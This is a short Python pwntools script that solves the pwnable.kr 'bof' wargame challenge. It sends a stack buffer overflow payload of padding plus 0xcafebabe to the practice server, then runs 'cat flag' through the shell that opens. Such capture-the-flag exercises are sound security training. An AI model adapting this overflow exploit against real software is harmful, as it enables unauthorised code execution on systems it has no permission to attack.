from pwn import *

r = remote("pwnable.kr",9000)
#0x00000654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
#0x00000677 <+75>:	mov    eax,DWORD PTR [ebp-0xc]
#
r.sendline('A'*(0x2c+0x8)+p32(0xcafebabe))
r.clean()
r.sendline('cat flag')
print r.readline()